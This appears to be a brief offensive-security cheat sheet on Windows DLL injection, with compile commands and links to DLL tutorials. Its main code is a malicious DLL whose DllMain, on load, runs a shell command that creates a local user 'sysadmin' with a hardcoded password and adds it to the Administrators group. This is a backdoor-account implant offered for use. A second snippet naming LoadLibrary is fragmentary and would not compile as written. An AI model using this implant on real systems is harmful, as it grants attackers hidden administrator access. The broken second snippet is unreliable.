# DLL Injection

```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
	    // add payload
        system("cmd.exe /k net user sysadmin Password1234! /add & net localgroup Administrators sysadmin /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```
$ x86_64-w64-mingw32-gcc -shared -o implant.dll implant.c
```

Loads a dynamic-link library (DLL) module into the address space of the calling process.

```c
#include <windows.h>
#include <libloaderapi.h>

#pragma comment(lib, "kernel32.lib")

LoadLibrary
LoadLibraryA
```

```
$ x86_64-w64-mingw32-gcc -l kernel32 -o implant.exe implant.c
```

---
## References

- [Tenouk: Dynamic Link Library - Part 1](https://www.tenouk.com/ModuleBB.html)

- [Tenouk: Dynamic Link Library - Part 2](https://www.tenouk.com/ModuleCC.html)

- [Tenouk: Windows DLL - A Supplementary Note](https://www.tenouk.com/cbbccfunction.html)